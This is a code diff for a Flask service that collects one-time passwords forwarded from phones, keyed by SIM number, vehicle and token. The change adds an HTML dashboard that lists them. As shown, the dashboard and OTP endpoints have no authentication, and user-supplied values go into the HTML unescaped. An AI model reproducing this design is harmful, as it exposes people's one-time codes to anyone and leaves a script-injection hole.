@@ -10,19 +10,13 @@ CORS(app)
 # Storage
 # =========================
 
-# OTP storage
 mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":...}]
 vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":...}]
+otp_data = {}      # token -> list of OTPs
+client_sessions = {}  # (token, sim_number/vehicle) -> {"first_request": datetime}
+login_sessions = {}   # mobile_number -> {"timestamp": datetime}
 
-# Browser sessions tracking
-client_sessions = {}  # key -> {"first_request": datetime}
-
-# Login detection storage
-login_sessions = {}  # mobile_number -> {"timestamp": datetime}
-
-# Timezone
 IST = zoneinfo.ZoneInfo("Asia/Kolkata")
-
 
 # =========================
 # Helpers
@@ -30,11 +24,9 @@ IST = zoneinfo.ZoneInfo("Asia/Kolkata")
 def now_str():
     return datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")
 
-
 # =========================
 # OTP Endpoints
 # =========================
-
 @app.route('/api/receive-otp', methods=['POST'])
 def receive_otp():
     try:
@@ -62,12 +54,16 @@ def receive_otp():
             mobile_otps.append(entry)
             print(f"[{now_str()}] 📦 Mobile OTP stored - OTP: {otp}, SIM: {sim_number}, Token: {token}")
 
+        # Add to otp_data grouped by token
+        if token not in otp_data:
+            otp_data[token] = []
+        otp_data[token].append(entry)
+
         return jsonify({"status": "success", "message": "OTP stored"}), 200
 
     except Exception as e:
         print("Error receiving from app:", e)
         return jsonify({"status": "error", "message": str(e)}), 400
-
 
 @app.route('/api/get-latest-otp', methods=['GET'])
 def get_latest_otp():
@@ -122,25 +118,130 @@ def get_latest_otp():
         else:
             return jsonify({"status": "empty", "message": "No new mobile OTP"}), 200
 
-
-@app.route('/api/status', methods=['GET'])
+# =========================
+# Status Endpoint
+# =========================
+@app.route('/api/status', methods=['GET', 'POST'])
 def status():
-    last_mobile = mobile_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if mobile_otps else "None"
-    last_vehicle = vehicle_otps[-1]["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if vehicle_otps else "None"
+    global otp_data, login_sessions
 
-    return jsonify({
-        "status": "active" if (mobile_otps or vehicle_otps) else "idle",
-        "last_mobile_otp_time": last_mobile,
-        "last_vehicle_otp_time": last_vehicle,
-        "mobile_otp_count": len(mobile_otps),
-        "vehicle_otp_count": len(vehicle_otps)
-    }), 200
+    # Handle POST for deletions
+    if request.method == 'POST':
+        if "delete_selected_otps" in request.form:
+            tokens_to_delete = request.form.getlist("otp_rows")
+            for t, idx in (x.split(":") for x in tokens_to_delete):
+                idx = int(idx)
+                if t in otp_data and 0 <= idx < len(otp_data[t]):
+                    otp_data[t].pop(idx)
+                    if not otp_data[t]:
+                        otp_data.pop(t)
+            return redirect(url_for('status'))
+
+        elif "delete_selected_logins" in request.form:
+            logins_to_delete = request.form.getlist("login_rows")
+            for m in logins_to_delete:
+                login_sessions.pop(m, None)
+            return redirect(url_for('status'))
+
+    # Prepare OTP table rows
+    otp_rows = ""
+    for t, entries in otp_data.items():
+        for i, e in enumerate(entries):
+            otp_rows += f"""
+            <tr>
+                <td><input type='checkbox' name='otp_rows' value='{t}:{i}'></td>
+                <td>{t}</td>
+                <td>{e.get('sim_number','')}</td>
+                <td>{e.get('vehicle','')}</td>
+                <td>{e.get('otp','')}</td>
+                <td>{e['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
+            </tr>
+            """
+
+    # Prepare Login table rows
+    login_rows = ""
+    for m, info in login_sessions.items():
+        login_rows += f"""
+        <tr>
+            <td><input type='checkbox' name='login_rows' value='{m}'></td>
+            <td>{m}</td>
+            <td>{info['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
+        </tr>
+        """
+
+    html = f"""
+    <html>
+    <head>
+        <title>KM OTP Dashboard</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; margin: 20px; }}
+            h2 {{ margin-bottom: 10px; }}
+            .container {{ display: flex; flex-direction: row; }}
+            .sidebar {{ width: 200px; }}
+            .content {{ flex-grow: 1; margin-left: 20px; }}
+            button {{ margin-bottom: 10px; display: block; width: 180px; }}
+            table {{ border-collapse: collapse; width: 100%; }}
+            th, td {{ border: 1px solid #ccc; padding: 5px; text-align: left; }}
+            th {{ background-color: #f4f4f4; }}
+        </style>
+        <script>
+            function showSection(id){{
+                document.getElementById('otp_section').style.display = id=='otp_section'?'block':'none';
+                document.getElementById('login_section').style.display = id=='login_section'?'block':'none';
+            }}
+        </script>
+    </head>
+    <body>
+        <h2>KM OTP</h2>
+        <div class="container">
+            <div class="sidebar">
+                <button onclick="showSection('otp_section')">OTP DATA</button>
+                <button onclick="showSection('login_section')">CLEAR LOGIN IDS</button>
+            </div>
+            <div class="content">
+                <div id="otp_section" style="display:none;">
+                    <h3>OTP Data</h3>
+                    <form method="POST">
+                        <table>
+                            <tr>
+                                <th>Select</th>
+                                <th>TOKEN</th>
+                                <th>MOBILE NUMBER</th>
+                                <th>VEHICLE</th>
+                                <th>OTP</th>
+                                <th>DATE</th>
+                            </tr>
+                            {otp_rows if otp_rows else '<tr><td colspan="6">No OTPs found</td></tr>'}
+                        </table>
+                        <button type="submit" name="delete_selected_otps">Delete Selected</button>
+                    </form>
+                </div>
+
+                <div id="login_section" style="display:none;">
+                    <h3>Login IDs</h3>
+                    <form method="POST">
+                        <table>
+                            <tr>
+                                <th>Select</th>
+                                <th>MOBILE NUMBER</th>
+                                <th>DATE</th>
+                            </tr>
+                            {login_rows if login_rows else '<tr><td colspan="3">No login sessions found</td></tr>'}
+                        </table>
+                        <button type="submit" name="delete_selected_logins">Delete Selected</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </body>
+    </html>
+    """
+    return html
 
 
 # =========================
-# Login Detection Endpoints
+# Login Detection
 # =========================
-
 @app.route('/api/login-detect', methods=['POST'])
 def login_detect():
     try:
@@ -148,15 +249,12 @@ def login_detect():
         mobile_number = (data.get('mobile_number') or "").strip().upper()
         if not mobile_number:
             return jsonify({"status": "error", "message": "mobile_number required"}), 400
-
         login_sessions[mobile_number] = {"timestamp": datetime.now(IST)}
         print(f"[{now_str()}] 🔑 Login detected for mobile: {mobile_number}")
         return jsonify({"status": "success", "message": "Login detected"}), 200
-
     except Exception as e:
         print("Error in login-detect:", e)
         return jsonify({"status": "error", "message": str(e)}), 400
-
 
 @app.route('/api/login-found', methods=['GET'])
 def login_found():
@@ -164,70 +262,15 @@ def login_found():
         mobile_number = (request.args.get('mobile_number') or "").strip().upper()
         if not mobile_number:
             return jsonify({"status": "error", "message": "mobile_number required"}), 400
-
         if mobile_number in login_sessions:
             ts = login_sessions[mobile_number]["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
             print(f"[{now_str()}] 🔍 Login found for mobile: {mobile_number}")
             return jsonify({"status": "found", "mobile_number": mobile_number, "timestamp": ts}), 200
         else:
             return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200
-
     except Exception as e:
         print("Error in login-found:", e)
         return jsonify({"status": "error", "message": str(e)}), 400
-
-
-# =========================
-# Login Management HTML Page
-# =========================
-
-@app.route('/manage-logins', methods=['GET', 'POST'])
-def manage_logins():
-    if request.method == 'POST':
-        if "delete_selected" in request.form:
-            to_delete = request.form.getlist("mobiles")
-            for m in to_delete:
-                login_sessions.pop(m, None)
-            print(f"[{now_str()}] 🗑️ Deleted selected mobiles: {to_delete}")
-        elif "delete_all" in request.form:
-            login_sessions.clear()
-            print(f"[{now_str()}] 🧹 Cleared all stored login detections")
-        return redirect(url_for('manage_logins'))
-
-    rows = "".join(
-        f"<tr><td><input type='checkbox' name='mobiles' value='{m}'></td><td>{m}</td><td>{info['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td></tr>"
-        for m, info in login_sessions.items()
-    )
-
-    html = f"""
-    <html>
-    <head>
-        <title>Manage Logins</title>
-        <style>
-            body {{ font-family: Arial, sans-serif; margin: 20px; }}
-            table {{ border-collapse: collapse; width: 100%; }}
-            th, td {{ border: 1px solid #ccc; padding: 8px; text-align: left; }}
-            th {{ background: #f4f4f4; }}
-            .actions {{ margin-top: 10px; }}
-        </style>
-    </head>
-    <body>
-        <h2>Login Sessions</h2>
-        <form method="POST">
-            <table>
-                <tr><th>Select</th><th>Mobile Number</th><th>Timestamp (IST)</th></tr>
-                {rows if rows else "<tr><td colspan='3'>No logins found</td></tr>"}
-            </table>
-            <div class="actions">
-                <button type="submit" name="delete_selected">Delete Selected</button>
-                <button type="submit" name="delete_all">Delete All</button>
-            </div>
-        </form>
-    </body>
-    </html>
-    """
-    return render_template_string(html)
-
 
 # =========================
 # Run App
